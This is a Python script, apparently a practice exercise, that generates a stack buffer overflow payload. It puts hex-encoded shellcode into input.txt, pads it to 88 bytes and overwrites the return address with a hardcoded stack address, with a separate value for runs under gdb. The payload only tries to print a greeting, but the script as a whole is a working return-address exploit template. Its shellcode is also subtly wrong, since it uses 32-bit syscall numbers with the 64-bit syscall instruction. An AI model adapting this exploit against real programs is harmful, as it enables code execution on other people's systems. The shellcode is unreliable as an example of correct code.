from binascii import unhexlify
from sys import argv

lenbeforeretaddr = 88*2
shellcode = "eb00e80e00000048656c6c6f2c20576f726c642100b804000000bf010000005eba0d0000000f05b8010000004831ff0f05"

if (len(argv) < 2) or (argv[1] != "gdb"): # NOT GDB VERSION
    newretaddr = "50eaffffff7f0000"
else: # GDB VERSION
    newretaddr = "10eaffffff7f0000"

string = shellcode + (lenbeforeretaddr - len(shellcode))*"0" + newretaddr

with open("input.txt", "wb") as f:
    f.write(unhexlify(string))
